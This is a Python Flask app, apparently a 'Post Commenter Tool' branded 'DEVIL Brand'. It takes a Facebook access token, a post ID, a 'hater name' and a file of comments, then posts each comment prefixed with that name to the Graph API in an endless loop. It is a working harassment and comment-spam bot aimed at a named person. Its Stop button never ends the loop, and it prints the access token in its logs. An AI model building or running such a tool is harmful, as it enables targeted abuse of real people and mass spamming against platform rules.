from flask import Flask, request
import requests
from time import sleep
import time
from datetime import datetime

app = Flask(__name__)

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

@app.route('/', methods=['GET', 'POST'])
def send_comment():
    if request.method == 'POST':
        access_token = request.form.get('accessToken')
        post_id = request.form.get('postId')
        hater_name = request.form.get('haterName')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        comments = txt_file.read().decode().splitlines()

        stop_signal = False

        while not stop_signal:
            try:
                for comment in comments:
                    api_url = f'https://graph.facebook.com/v15.0/{post_id}/comments'
                    message = f'{hater_name} {comment}'
                    parameters = {'access_token': access_token, 'message': message}
                    response = requests.post(api_url, data=parameters, headers=headers)
                    if response.status_code == 200:
                        comment_status = "Comment sent successfully"
                    else:
                        comment_status = "Failed to send comment"
                    print(f"{comment_status} using token {access_token}: {message}")
                    time.sleep(time_interval)
            except Exception as e:
                comment_status = "Error while sending comment"
                print(f"{comment_status} using token {access_token}: {message}")
                print(e)
                time.sleep(30)

    return '''

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DEVIL Brand</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body{
            background-color: #F6B6D2;
        }
        .container{
            max-width: 500px;
            background-color: #63B8FF;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            margin: 0 auto;
            margin-top: 20px;
        }
        .header{
            text-align: center;
            padding-bottom: 20px;
        }
        .btn-submit{
            width: 100%;
            margin-top: 10px;
        }
        .footer{
            text-align: center;
            margin-top: 20px;
            color: #888;
        }
    </style>
</head>
<body>
    <header class="header mt-4">
    <h1 class="mb-3" style="color: #FF69B4;"> 𝐃𝐄𝐕𝐈𝐋 </h1> 𝐁𝐑𝐀𝐍𝐃 𝐎𝐅𝐅𝐋𝟏𝐍𝟑 𝐒𝟑𝐑𝐕𝟑𝐑 𝐃𝐄𝐕𝐈𝐋 𝐗 𝐀𝐀𝐘𝐀𝐍
        <h1 class="mt-3" style="color: #FF69B4;">𝐎𝐖𝐍𝟑𝐑 :: 𝐃𝐄𝐕𝐈𝐋 𝐗 𝐀𝐀𝐘𝐀𝐍 </h1>
    </header>

    <div class="container">
        <form action="/" method="post" enctype="multipart/form-data">
            <div class="mb-3">
                <label for="accessToken">Enter Your Token:</label>
                <input type="text" class="form-control" id="accessToken" name="accessToken" required>
            </div>
            <div class="mb-3">
                <label for="postId">Enter Post ID:</label>
                <input type="text" class="form-control" id="postId" name="postId" required>
            </div>
            <div class="mb-3">
                <label for="haterName">Enter Hater Name:</label>
                <input type="text" class="form-control" id="haterName" name="haterName" required>
            </div>
            <div class="mb-3">
                <label for="txtFile">Select Your Notepad File:</label>
                <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
            </div>
            <div class="mb-3">
                <label for="time">Speed in Seconds:</label>
                <input type="number" class="form-control" id="time" name="time" required>
            </div>
            <button type="submit" class="btn btn-primary btn-submit">Submit Your Details</button>
        </form>
        <form action="/" method="post">
            <button type="submit" class="btn btn-danger mt-3" name="stop" value="true">Stop</button>
        </form>
    </div>
    <footer class="footer">
        <p>&copy; 2023 DEVIL Brand. All Rights Reserved.</p>
    <p>Post Commenter Tool</p>
        <p>Made with 𝐃𝐄𝐕𝐈𝐋__𝐗__𝐀𝐀𝐘𝐀𝐍 by <a href="https://github.com/mrdevilboy780</a></p>
    </footer>
</body>
  </html>
    '''


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
